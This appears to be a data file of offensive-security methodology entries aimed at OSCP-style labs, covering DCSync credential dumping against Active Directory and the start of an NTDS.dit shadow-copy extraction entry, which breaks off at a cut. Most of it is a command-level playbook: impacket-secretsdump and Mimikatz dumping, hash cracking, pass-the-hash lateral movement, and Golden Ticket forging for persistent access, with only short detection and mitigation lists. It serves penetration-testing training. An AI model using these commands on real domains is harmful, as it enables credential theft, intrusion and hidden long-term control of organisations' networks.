"ad-dcsync-methodology","DC Sync Attack Methodology","Complete methodology for extracting domain credentials via Directory Replication Service (DRS) protocol. Remote credential dumping without DC access.","OSCP:HIGH|ACTIVE_DIRECTORY|DCSYNC|CREDENTIAL_DUMPING|POST_EXPLOITATION|METHODOLOGY|PERSISTENCE|GOLDEN_TICKET","{""what_is_dcsync"": ""DCSync is a credential extraction technique that abuses the Directory Replication Service (DRS) Remote Protocol used by domain controllers to synchronize Active Directory data. By impersonating a domain controller and requesting credential updates via the IDL_DRSGetNCChanges API, an attacker can remotely extract password hashes without executing code on the domain controller or accessing its filesystem. The domain controller receiving the request does not verify whether it came from a legitimate DC - it only checks that the requesting Security Identifier (SID) has appropriate replication privileges."", ""how_to_recognize_dcsync_opportunity"": [""You have compromised a Domain Admin, Enterprise Admin, or Administrators group member"", ""You have access to an account with explicit replication rights (rare but possible)"", ""You need to extract krbtgt hash for Golden Ticket creation"", ""You want to obtain Administrator or service account credentials"", ""You have network connectivity to a domain controller (RPC ports 135, 445, dynamic high ports)"", ""You want to avoid directly accessing the domain controller filesystem (NTDS.dit extraction)"", ""You need remote credential dumping from Linux (Kali) using Impacket""], ""when_to_use_dcsync"": [""After achieving Domain Admin access (first action: DCSync krbtgt for persistence)"", ""When you need specific user credentials without full NTDS.dit dump"", ""When LSA memory dumping is blocked by EDR/AV or credential guard"", ""When you don't have physical/RDP access to the domain controller"", ""When you want to minimize forensic footprint (no NTDS.dit file copies)"", ""During post-exploitation for lateral movement credentials"", ""For obtaining service account credentials (SPNs) for further attacks""], ""prerequisites"": [""Domain Admin, Enterprise Admin, OR Administrators group membership"", ""OR explicit replication rights: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All"", ""Network connectivity to Domain Controller (TCP/UDP 135, 445, 389, 88)"", ""Tools: Mimikatz (Windows) OR impacket-secretsdump (Linux/Kali - RECOMMENDED for OSCP)"", ""Valid domain credentials (plaintext password OR NTLM hash for Pass-the-Hash)""], ""key_differences_from_alternatives"": [""vs LSA Dump: DCSync is REMOTE (no DC access needed), LSA requires code execution ON the domain controller"", ""vs NTDS.dit Extraction: DCSync uses network protocol (DRS), NTDS requires filesystem access and offline parsing"", ""vs Memory Dumping (Mimikatz sekurlsa::): DCSync targets DC remotely, memory dumps target local LSASS process"", ""vs Kerberoasting: DCSync extracts NTLM hashes (any user), Kerberoasting extracts TGS tickets (SPN accounts only)"", ""vs Pass-the-Hash: DCSync OBTAINS hashes, PTH USES already-obtained hashes for authentication""], ""detection_indicators"": [""Event ID 4662 on Domain Controller: 'An operation was performed on an object' with Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) and {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)"", ""Event ID 4624: Logon Type 3 (network logon) to Domain Controller from non-DC system"", ""Event ID 5136: Directory service object modified (if monitoring replication requests)"", ""Replication requests originating from workstation IPs (not DC IP addresses)"", ""Unusual replication activity during non-business hours"", ""Replication requests for single user accounts (legitimate DC-to-DC sync replicates all)"", ""Multiple sequential replication requests targeting high-value accounts (krbtgt, Administrator)""], ""mitigation_and_defense"": [""Restrict replication rights to Domain Controllers only (remove from service accounts)"", ""Monitor Event ID 4662 for replication requests from non-DC sources"", ""Implement honeypot krbtgt monitoring (detect unauthorized DCSync attempts)"", ""Use Microsoft ATA/Defender for Identity (alerts on DCSync behavior)"", ""Enable Protected Users group for high-value accounts (reduces hash exposure)"", ""Implement tiered administrative model (separate admin accounts for workstations vs DCs)"", ""Regular krbtgt password rotation (twice, to clear password history)"", ""Network segmentation: Domain Controllers in separate VLAN with strict firewall rules""]}","[{""title"": ""Scenario 1: Understanding DC Sync Prerequisites and Rights Verification"", ""context"": ""You have compromised a workstation as a low-privileged domain user (dave). Through additional exploitation or credential dumping, you've obtained credentials for the account 'jeffadmin' which you suspect has elevated privileges. Before attempting DCSync, you need to verify this account has the necessary rights."", ""objective"": ""Verify Domain Admin membership or replication privileges before attempting DCSync to avoid failed attack attempts and unnecessary alerting."", ""approach"": [""1. UNDERSTAND THE REQUIREMENTS: DCSync requires Domain Admin OR explicit replication rights. Replication rights are granted to three built-in groups by default: Domain Admins (SID *-512), Enterprise Admins (SID *-519), and Administrators (SID *-544). Additionally, Domain Controllers have these rights (computer accounts in Domain Controllers OU)."", ""2. METHOD A - CHECK GROUP MEMBERSHIP (FASTEST): From a Windows command prompt authenticated as jeffadmin, run: whoami /groups | findstr /I \""Domain Admins\"". This displays all security groups for the current user. Look for 'CORP\\Domain Admins' in the output. If present, you have DCSync capability."", ""3. METHOD B - QUERY DOMAIN ADMINS GROUP: Run: net group \""Domain Admins\"" /domain. This queries the domain controller for all members of the Domain Admins group. Verify 'jeffadmin' appears in the 'Members' list. This method is authoritative (queries DC directly) but requires domain connectivity."", ""4. METHOD C - ADVANCED (IF NOT DOMAIN ADMIN): If jeffadmin is NOT a Domain Admin, check for explicit replication rights. This is rare but possible in environments with custom permission delegation. From PowerShell with RSAT installed: (Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights. Both GUIDs must be present."", ""5. VERIFY CONNECTIVITY: Test domain controller reachability: nltest /dsgetdc:corp.com. Verify DNS resolution: nslookup corp.com. Test SMB/RPC connectivity: Test-NetConnection DC1.corp.com -Port 445. These ports are required: 135 (RPC), 445 (SMB), 389 (LDAP), 88 (Kerberos)."", ""6. DOCUMENT FINDINGS: Save verification results to enumeration.md. Record: jeffadmin group memberships, domain controller IP/FQDN, connectivity test results. This documentation prevents re-verification and helps troubleshooting if DCSync fails.""], ""commands"": [""ad-dcsync-check-user-groups"", ""ad-dcsync-check-domain-admins"", ""ad-dcsync-check-replication-rights""], ""expected_outcome"": ""You confirm jeffadmin is a member of Domain Admins group OR has explicit replication rights. You have verified network connectivity to the domain controller. You are ready to proceed with DCSync credential extraction."", ""why_this_works"": ""Active Directory's security model trusts ANY principal with replication rights to request password data. The domain controller uses the Directory Replication Service (DRS) Remote Protocol (MS-DRSR) to synchronize data between DCs. When a replication request arrives, the DC validates that the caller's SID has the extended rights 'DS-Replication-Get-Changes' (basic metadata) and 'DS-Replication-Get-Changes-All' (sensitive data including password hashes). It does NOT verify the request originated from a domain controller computer account. This design allows legitimate scenarios like backup software with delegated permissions, but attackers abuse it by using compromised Domain Admin accounts."", ""common_mistakes"": [""Assuming any domain user can DCSync (only Domain Admins or explicit replication rights work)"", ""Not verifying connectivity to DC before attempting DCSync (wastes time on network troubleshooting)"", ""Using local administrator credentials instead of domain credentials (DCSync requires domain authentication)"", ""Testing from non-domain-joined machine without proper authentication (use runas /netonly for domain context)"", ""Forgetting to check if account is locked or disabled (net user jeffadmin /domain shows account status)""], ""oscp_exam_relevance"": ""HIGH - Prerequisite verification saves critical exam time. In OSCP labs, you typically obtain Domain Admin through privilege escalation or lateral movement. Immediately verify rights and document DC connectivity before attempting DCSync. This prevents wasted time on failed attacks.""}, {""title"": ""Scenario 2: Extracting Single User Credentials with DCSync"", ""context"": ""You have verified jeffadmin is a Domain Admin. During reconnaissance, you identified a user account 'dave' who appears to have access to sensitive file shares. You want to extract dave's password hash to either crack it for plaintext password or use it for Pass-the-Hash lateral movement."", ""objective"": ""Extract dave's NTLM password hash using DCSync technique, then crack the hash with Hashcat or use it for Pass-the-Hash authentication."", ""approach"": [""1. CHOOSE YOUR METHOD: You have two primary DCSync tools: Mimikatz (Windows) or impacket-secretsdump (Linux/Kali). For OSCP exams, impacket-secretsdump is RECOMMENDED because: (a) Runs on Kali (no AV interference), (b) Clean, parseable output, (c) No need for RDP/shell on Windows target, (d) Same command works for Pass-the-Hash."", ""2. WINDOWS METHOD (MIMIKATZ): If you're already on a compromised Windows machine with Mimikatz available, launch PowerShell or cmd.exe as jeffadmin. Navigate to Mimikatz directory: cd C:\\Tools. Launch Mimikatz: .\\mimikatz.exe. Run DCSync command: lsadump::dcsync /user:corp\\dave. Mimikatz will display extensive output including SAM username, RID, account flags, and multiple hash formats."", ""3. LINUX METHOD (IMPACKET - RECOMMENDED): From your Kali machine, use impacket-secretsdump. The syntax is: impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'. CRITICAL: Use SINGLE QUOTES around the authentication string to prevent shell interpretation of special characters in the password (!, $, \\, etc.). The -just-dc-user flag targets only dave (faster and less noisy than full domain dump)."", ""4. PARSE THE OUTPUT: Impacket output format: dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::. This is Hashcat-ready format. The hash structure: username:RID:LM_hash:NTLM_hash:::. The LM hash portion (aad3b435b51404eeaad3b435b51404ee) indicates empty/disabled LM hashing (modern Windows). The NTLM hash (08d7a47...) is what you need. Copy this entire line or just the NTLM portion."", ""5. CRACK THE HASH: Save hash to file: echo '08d7a47a6f9f66b97b1bae4178747494' > dave_hash.txt. Use Hashcat mode 1000 (NTLM): hashcat -m 1000 dave_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force. Start this in background with: hashcat ... & disown. While cracking runs, you can use the hash immediately for Pass-the-Hash."", ""6. USE HASH IMMEDIATELY (PASS-THE-HASH): Don't wait for cracking to complete. Use the NTLM hash for authentication: impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75 (target machine where dave has admin rights). Or access SMB shares: smbclient //192.168.50.75/Data -U dave --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494."", ""7. DOCUMENT EVERYTHING: Save to exploitation.md: (a) DCSync command used, (b) Output with NTLM hash, (c) Cracked password (if successful), (d) Systems where dave has admin rights, (e) SMB shares accessed with dave's credentials, (f) Time spent (for exam time management).""], ""commands"": [""ad-dcsync-secretsdump-user"", ""ad-dcsync-mimikatz-user"", ""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-impacket-psexec""], ""expected_outcome"": ""You successfully extract dave's NTLM hash (08d7a47a6f9f66b97b1bae4178747494). Hashcat cracks it to plaintext password 'Flowers1'. You use the hash for Pass-the-Hash lateral movement to CLIENT75 where dave is a local administrator. You gain command execution on CLIENT75 and extract additional credentials from LSASS memory."", ""why_this_works"": ""The Directory Replication Service allows domain controllers to request password data for specific users via IDL_DRSGetNCChanges API. When you run DCSync targeting dave, the domain controller retrieves dave's password verifier (NTLM hash) from the NTDS.dit database and transmits it over the network. The DC packages this as a replication response, identical to legitimate DC-to-DC synchronization. Your tools (Mimikatz or Impacket) parse this response and extract the hash. The hash is sufficient for Pass-the-Hash attacks because NTLM authentication uses the hash directly, not the plaintext password. NTLM challenge-response: Client proves knowledge of hash by encrypting server's challenge with the hash."", ""common_mistakes"": [""Forgetting single quotes around auth string in impacket-secretsdump (special characters break command parsing)"", ""Using IP address instead of FQDN for subsequent Pass-the-Hash with Kerberos (IP forces NTLM, FQDN enables Kerberos)"", ""Waiting for Hashcat to finish before using hash (use hash immediately with PTH while cracking runs in background)"", ""Not documenting which systems dave has admin rights on (wastes time re-testing access)"", ""Copying partial hash or including colons/spaces (hash must be exactly 32 hexadecimal characters)"", ""Using wrong Hashcat mode (mode 1000 for NTLM, mode 3000 for LM, mode 5600 for NTLMv2)""], ""oscp_exam_relevance"": ""MEDIUM-HIGH - While OSCP exam typically provides initial access as low-privileged user, lateral movement often requires credential extraction. DCSync is faster and cleaner than memory dumping (no AV interference). The Pass-the-Hash technique works even if password is complex/uncrackable. Time estimate: 2-10 seconds for DCSync, 1-60+ minutes for hash cracking (run in background).""}, {""title"": ""Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack"", ""context"": ""You have achieved Domain Admin access as jeffadmin. You want to establish persistent domain-wide access that survives password changes and account lockouts. Your target is the krbtgt account hash, which enables Golden Ticket creation."", ""objective"": ""Extract the krbtgt account password hash, obtain the Domain SID, and prepare data for Golden Ticket creation. This provides long-term persistence independent of other account credentials."", ""approach"": [""1. UNDERSTAND KRBTGT'S ROLE: The krbtgt account (RID 502) is a disabled service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Its password hash is the cryptographic key for TGT validation. With this hash, you can forge TGTs (Golden Tickets) that grant Domain Admin rights to any user. The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (e.g., Server 2003 \u2192 2008). In mature environments, this hash may be 10+ years old."", ""2. DCSYNC KRBTGT (IMPACKET METHOD - RECOMMENDED): From Kali, run: impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'. This targets only the krbtgt account. Output format: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::. The NTLM hash (1693c6ce...) is your Golden Ticket key. Save this immediately - it's your persistent backdoor."", ""3. DCSYNC KRBTGT (MIMIKATZ METHOD): If using Windows, launch Mimikatz and run: lsadump::dcsync /user:corp\\krbtgt. Parse the output for 'Hash NTLM: [32 hex characters]'. You may also see AES256 and AES128 keys - save these for stealthier Golden Tickets (AES encryption is less suspicious than RC4)."", ""4. OBTAIN DOMAIN SID: The Domain SID is required for Golden Ticket creation. From Windows as any domain user: whoami /user. Output shows: corp\\jeffadmin S-1-5-21-1987370270-658905905-1781884369-1105. The Domain SID is S-1-5-21-1987370270-658905905-1781884369 (remove the user RID -1105). From Linux: lookupsid.py 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70' | grep 'Domain SID'. Or: rpcclient -U 'corp.com/jeffadmin%BrouhahaTungPerorateBroom2023!' 192.168.50.70 -c 'lsaquery'."", ""5. OBTAIN DOMAIN FQDN: Required for Golden Ticket. From Windows: echo %USERDNSDOMAIN%. Output: corp.com. From Linux, use the FQDN you've been using (corp.com). Alternatively, query DNS: dig -t SRV _ldap._tcp.dc._msdcs.corp.com (shows domain FQDN)."", ""6. DOCUMENT THE GOLDEN TICKET DATA: Save to breakthrough.md: (a) krbtgt NTLM hash: 1693c6cefafffc7af11ef34d1c788f47, (b) Domain SID: S-1-5-21-1987370270-658905905-1781884369, (c) Domain FQDN: corp.com, (d) AES256 key (if available): [64 hex chars], (e) Target username for ticket (can be any existing user, e.g., jen). These four values are ALL you need for Golden Ticket persistence."", ""7. NEXT STEPS - GOLDEN TICKET CREATION: You now have everything needed for Golden Ticket. From Windows with Mimikatz: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt. From Linux with Impacket: ticketer.py -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com jen. Then use the ticket: export KRB5CCNAME=jen.ccache && psexec.py -k -no-pass corp.com/jen@DC1.corp.com.""], ""commands"": [""ad-dcsync-secretsdump-krbtgt"", ""ad-dcsync-mimikatz-krbtgt"", ""ad-sid-whoami-extract"", ""ad-golden-ticket-ticketer-create"", ""ad-golden-ticket-mimikatz-create""], ""expected_outcome"": ""You successfully extract: krbtgt NTLM hash (1693c6ce...), Domain SID (S-1-5-21-1987370270-658905905-1781884369), and Domain FQDN (corp.com). You create a Golden Ticket for user 'jen' and inject it into memory. You can now access any system in the domain with Domain Admin rights, even if all other passwords change. The krbtgt hash remains valid for years (until manual rotation)."", ""why_this_works"": ""Kerberos authentication relies on the krbtgt account's password hash as the cryptographic key for TGT encryption and validation. When a user authenticates, the KDC issues a TGT encrypted with the krbtgt hash. The TGT contains a PAC (Privilege Attribute Certificate) with group memberships, including Domain Admins. When you possess the krbtgt hash, you can forge TGTs with arbitrary PAC data - you can claim to be any user with any group memberships. The domain controller cannot distinguish your forged TGT from a legitimate one because the encryption is cryptographically valid. The DC decrypts your Golden Ticket with the krbtgt hash, validates the signature, and trusts the PAC data. You gain Domain Admin rights without the domain admin password ever being used."", ""common_mistakes"": [""Including user RID in Domain SID parameter (remove -1105 from S-1-5-21-...-1105)"", ""Using fictional username for Golden Ticket on patched systems (July 2022 update requires existing accounts)"", ""Not saving krbtgt hash externally (if you lose access, you lose persistence)"", ""Using IP addresses instead of FQDNs when using Golden Ticket (Kerberos requires hostnames)"", ""Creating Golden Ticket with unrealistic lifetime (default 10 years is suspicious - consider 90 days)"", ""Forgetting to purge existing tickets before injecting Golden Ticket (klist purge)""], ""oscp_exam_relevance"": ""VERY HIGH - This is the ULTIMATE privilege escalation in Active Directory. Once you achieve Domain Admin, immediately DCSync krbtgt for persistence. If the exam resets or your session dies, you can recreate the Golden Ticket for instant Domain Admin re-entry. Time estimate: 2-10 seconds for krbtgt extraction, 1-2 minutes for complete Golden Ticket workflow including SID extraction and ticket creation.""}, {""title"": ""Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration"", ""context"": ""You have used DCSync to extract multiple user hashes: dave (standard user), Administrator (domain admin), and several service accounts. You want to crack these hashes for plaintext passwords while simultaneously using them for Pass-the-Hash lateral movement."", ""objective"": ""Set up efficient hash cracking workflow with Hashcat while leveraging hashes immediately for Pass-the-Hash authentication. Maximize efficiency by running cracking in background."", ""approach"": [""1. ORGANIZE EXTRACTED HASHES: After DCSync extraction, save all hashes to a file in Hashcat format. Create dave_hashes.txt with content: 08d7a47a6f9f66b97b1bae4178747494 (just NTLM, no username/RID). For multiple users, create all_hashes.txt with one hash per line. This format works directly with Hashcat mode 1000."", ""2. START HASHCAT IN BACKGROUND: Launch Hashcat with background processing: hashcat -m 1000 all_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force & disown. The & runs it in background, disown detaches it from your terminal. Check progress later with: hashcat -m 1000 all_hashes.txt --show (displays cracked hashes)."", ""3. PARALLEL PASS-THE-HASH TESTING: While Hashcat runs, immediately test hashes for lateral movement. Use CrackMapExec for rapid admin access discovery: crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com. This tests dave's hash against all hosts in the subnet. Output shows 'Pwn3d!' for systems where dave is local admin."", ""4. TARGETED LATERAL MOVEMENT: Once you identify systems where dave is admin (e.g., CLIENT75), use impacket for command execution: impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75. Or for stealth, use wmiexec (doesn't write to disk): impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75."", ""5. PRIORITIZE HIGH-VALUE HASHES: Focus cracking effort on Administrator and service account hashes. These are more likely to have complex passwords requiring longer cracking time. Meanwhile, standard user hashes (dave) may crack within minutes using rockyou.txt. Check cracking status periodically: watch -n 60 'hashcat -m 1000 all_hashes.txt --show | wc -l' (refreshes every 60 seconds)."", ""6. USE CRACKED PASSWORDS FOR RDP/SMB: When Hashcat cracks a password, you can use it for RDP access (more convenient than command-line shells): xfreerdp /u:dave /p:Flowers1 /d:corp.com /v:192.168.50.75. Or mount SMB shares: mount -t cifs //192.168.50.75/C$ /mnt/client75 -o username=dave,password=Flowers1,domain=corp.com."", ""7. DOCUMENT CRACKED CREDENTIALS: Maintain a credentials table in post_exploitation.md: | Username | NTLM Hash | Plaintext | Systems | Access Level | | dave | 08d7a47... | Flowers1 | CLIENT75, CLIENT76 | Local Admin | | Administrator | 2892d26... | (cracking...) | DC1, all systems | Domain Admin |. This prevents duplicate work and helps with reporting.""], ""commands"": [""windows-hashcat-crack-ntlm-file"", ""ad-pass-the-hash-crackmapexec"", ""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-impacket-wmiexec"", ""windows-rdp-xfreerdp""], ""expected_outcome"": ""Hashcat cracks dave's hash to 'Flowers1' within 5 minutes. Administrator hash is still cracking after 30 minutes (complex password). You use dave's hash via Pass-the-Hash to access CLIENT75 and CLIENT76 (local admin). You extract additional credentials from CLIENT75's LSASS memory. You use Administrator's hash (even without plaintext) to access domain controller via wmiexec. Total time efficiency: Hash cracking runs overnight, but you gain immediate access via PTH."", ""why_this_works"": ""NTLM authentication uses the password hash directly, not the plaintext password. The NTLM challenge-response protocol: (1) Client requests access, (2) Server sends random challenge, (3) Client encrypts challenge with NTLM hash, (4) Server verifies encryption matches expected value. At no point is the plaintext password transmitted or required. This means an attacker with the NTLM hash can authenticate identically to a user with the plaintext password. Hash cracking is useful for: (1) RDP access (requires plaintext), (2) Web applications (require plaintext), (3) Credential reuse testing (users reusing passwords), (4) Reporting (demonstrating weak passwords). But for Windows network authentication, the hash alone is sufficient."", ""common_mistakes"": [""Waiting for hashes to crack before attempting lateral movement (use PTH immediately)"", ""Not running Hashcat in background (occupies terminal, blocks other work)"", ""Using wrong Hashcat mode (mode 1000 for NTLM, not 3000 LM or 5600 NTLMv2)"", ""Not documenting which systems each user has admin rights on (duplicate effort)"", ""Forgetting to use --force flag in VMs (Hashcat requires it for virtualized GPUs)"", ""Not checking cracking status periodically (may crack hours ago without notification)"", ""Trying to RDP with hash instead of password (RDP requires plaintext, use xfreerdp with cracked password)""], ""oscp_exam_relevance"": ""HIGH - Time management is critical in OSCP. Running hash cracking in background while performing lateral movement maximizes efficiency. You may crack additional credentials hours later that open new attack paths. Pass-the-Hash works immediately even for complex 20+ character passwords that would take days to crack. Time estimate: PTH lateral movement 10-30 seconds per host, hash cracking 1 minute - 24+ hours depending on password complexity.""}]","[{""title"": ""Phase 1: Prerequisites and Rights Verification"", ""notes"": ""Before attempting DCSync, verify you have Domain Admin membership OR explicit replication rights. Test domain controller connectivity and save DC IP/FQDN for commands."", ""commands"": [{""id"": ""ad-dcsync-check-user-groups"", ""example"": ""whoami /groups"", ""shows"": ""Output contains: 'GROUP INFORMATION'""}, {""id"": ""ad-dcsync-check-domain-admins"", ""example"": ""net group \""Domain Admins\"" /domain"", ""shows"": ""Output contains: 'Group name     Domain Admins'""}, {""id"": ""ad-dcsync-check-replication-rights"", ""example"": ""powershell -c \""(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType\"""", ""shows"": ""Output shows: IdentityReference = <DOMAIN>\\<USERNAME>""}]}, {""title"": ""Phase 2: Credential Extraction (Windows - Mimikatz)"", ""notes"": ""Windows-based DCSync using Mimikatz. Useful when you have RDP/shell access to a Windows machine. Requires Mimikatz binary on target system."", ""commands"": [{""id"": ""ad-dcsync-mimikatz-user"", ""example"": ""mimikatz # lsadump::dcsync /user:corp\\dave"", ""shows"": ""Output: '[DC] <DOMAIN>.com will be the domain'""}, {""id"": ""ad-dcsync-mimikatz-krbtgt"", ""example"": ""mimikatz # lsadump::dcsync /user:corp\\krbtgt"", ""shows"": ""Output: 'SAM Username : krbtgt'""}, {""id"": ""ad-dcsync-mimikatz-administrator"", ""example"": ""mimikatz # lsadump::dcsync /user:corp\\Administrator"", ""shows"": ""Output: 'SAM Username : Administrator'""}]}, {""title"": ""Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]"", ""notes"": ""Linux-based DCSync from Kali using impacket-secretsdump. RECOMMENDED for OSCP - no AV interference, clean output, works with Pass-the-Hash authentication."", ""commands"": [{""id"": ""ad-dcsync-secretsdump-user"", ""example"": ""impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'"", ""shows"": ""Output: 'Impacket v0.x.x - Copyright 2022 SecureAuth Corp...""}, {""id"": ""ad-dcsync-secretsdump-krbtgt"", ""example"": ""impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'"", ""shows"": ""Output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTL...""}, {""id"": ""ad-dcsync-secretsdump-all"", ""example"": ""impacket-secretsdump -just-dc 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'"", ""shows"": ""Output: '[*] Dumping Domain Credentials (domain\\uid:rid:l...""}]}, {""title"": ""Phase 4: Hash Cracking and Pass-the-Hash"", ""notes"": ""Process extracted hashes for either plaintext password recovery (Hashcat) or immediate use via Pass-the-Hash. Run cracking in background while performing lateral movement."", ""commands"": [{""id"": ""windows-hashcat-crack-ntlm"", ""example"": ""hashcat -m 1000 -a 0 dave_hash.txt /usr/share/wordlists/rockyou.txt --force"", ""shows"": ""Output: 'Session..........: hashcat'""}, {""id"": ""ad-pass-the-hash-crackmapexec"", ""example"": ""crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com"", ""shows"": ""Output: '<IP> (Pwn3d!)' - User has LOCAL ADMINISTRATOR ri...""}, {""id"": ""ad-pass-the-hash-impacket-psexec"", ""example"": ""impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75"", ""shows"": ""Output: '[*] Requesting shares on <TARGET>....'""}]}, {""title"": ""Phase 5: Persistence via Golden Ticket"", ""notes"": ""Use extracted krbtgt hash to create Golden Tickets for long-term domain persistence. Requires: krbtgt NTLM hash, Domain SID, Domain FQDN, valid username."", ""commands"": [{""id"": ""ad-sid-whoami-extract"", ""example"": ""whoami /user"", ""shows"": ""Output displays 'User Name' and 'SID' columns""}, {""id"": ""ad-golden-ticket-purge-tickets"", ""example"": ""mimikatz # kerberos::purge"", ""shows"": ""Output: 'Ticket(s) purge for current session is OK'""}, {""id"": ""ad-golden-ticket-mimikatz-create"", ""example"": ""mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt"", ""shows"": ""Output: 'User      : <username>'""}, {""id"": ""ad-golden-ticket-ticketer-create"", ""shows"": ""See command documentation""}]}]"
"ad-shadow-copy-ntds-extraction-methodology","Active Directory NTDS.dit Extraction via Shadow Copies","Complete methodology for extracting Active Directory credentials by abusing Volume Shadow Copies to access locked NTDS.dit database offline","ACTIVE_DIRECTORY|NTDS|SHADOW_COPY|VSS|CREDENTIAL_ACCESS|PERSISTENCE|OSCP:HIGH","{""what_is_shadow_copy"": ""Volume Shadow Copy Service (VSS) is a Microsoft backup technology that creates point-in-time snapshots of files or entire volumes. Shadow copies allow access to previous file versions, including files locked by the operating system. NTDS.dit is the Active Directory database containing ALL domain credentials (NTLM hashes, Kerberos keys, user objects, group memberships). During normal DC operation, NTDS.dit is exclusively locked by the lsass.exe process - cannot be copied directly. Shadow copies bypass this lock by accessing a snapshot where files appear unlocked. Combined with SYSTEM registry hive (contains boot key for decryption), NTDS.dit can be parsed offline to extract every domain credential without network detection."", ""how_to_recognize"": [""You have Domain Admin OR local Administrator access on a Domain Controller"", ""Target is Windows Server acting as Active Directory DC (check: echo %LOGONSERVER%, nltest /dclist:<domain>)"", ""VSS service enabled and running (default on Windows Server - verify: sc query vss)"", ""Looking for credential persistence technique that works offline without DCSync replication rights"", ""Need ALL domain credentials (not just specific users), including krbtgt hash for Golden Ticket attacks"", ""Alternative to DCSync when: (1) Want offline analysis (no network requests), (2) Already have DC access but not replication rights, (3) Prefer file-based evidence over network-based DCSync traffic""], ""when_to_look_for"": [""POST-EXPLOITATION: After gaining Domain Admin or DC local Administrator access"", ""PERSISTENCE phase: Extracting credentials for long-term access (hashes don't change unless password reset)"", ""OSCP exam: HIGH priority if DC compromised - provides complete domain credential set for lateral movement"", ""CREDENTIAL HARVESTING: When DCSync unavailable/undesirable (OPSEC, rights missing, network monitoring concerns)"", ""Time estimate: 2-5 minutes total (shadow creation 10-30s, file extraction 30s, transfer 1-2min, parsing 10-60s)""], ""prerequisites"": [""Local Administrator on Domain Controller OR SeBackupPrivilege (Backup Operators group)"", ""Volume Shadow Copy Service enabled and running (sc query vss shows STATE: RUNNING)"", ""Sufficient disk space for shadow copy (typically 10-30% of C: drive size)"", ""File transfer method to Kali: SMB share, HTTP server (python3 -m http.server), certutil base64 encoding, impacket-smbserver"", ""Impacket installed on Kali Linux (apt install impacket-scripts - includes secretsdump)"", ""NTDS.dit default path accessible: C:\\Windows\\NTDS\\ntds.dit (verify: dir C:\\Windows\\NTDS)""], ""key_differences_from_dcsync"": [""RIGHTS: Shadow copies require local Administrator on DC. DCSync requires DS-Replication-Get-Changes extended rights (Domain Admin, Domain Controllers, Administrators groups by default)."", ""NETWORK TRAFFIC: Shadow copies = local file operations only (no network). DCSync = network traffic to DC via RPC/DRSUAPI (detectable)."", ""SCOPE: Shadow copies extract ENTIRE database (all users at once). DCSync can target specific users (lsadump::dcsync /user:krbtgt)."", ""STEALTH: DCSync often stealthier (legitimate replication traffic). Shadow copies leave file artifacts (copied NTDS.dit, SYSTEM hive, shadow copy creation events)."", ""EXECUTION LOCATION: Shadow copies require running commands ON the DC. DCSync can run remotely from any domain-joined machine with appropriate rights."", ""FORENSICS: Shadow copies create Event 8222 (shadow created), 4663 (file access if auditing enabled), copied files on disk. DCSync creates 4662 (directory service access) with replication GUID."", ""OSCP EXAM: Shadow copies PREFERRED when you have DC shell but uncertain about DCSync rights. DCSync PREFERRED when you have Domain Admin from workstation (no DC access needed).""], ""detection_indicators"": [""Event ID 8222 (VSS): Shadow copy created - unusual on Domain Controllers (DCs typically don't use shadow copies for backup, prefer Windows Server Backup or dedicated solutions)"", ""Event ID 8224 (VSS): Shadow copy deleted, especially with /quiet flag (suppresses 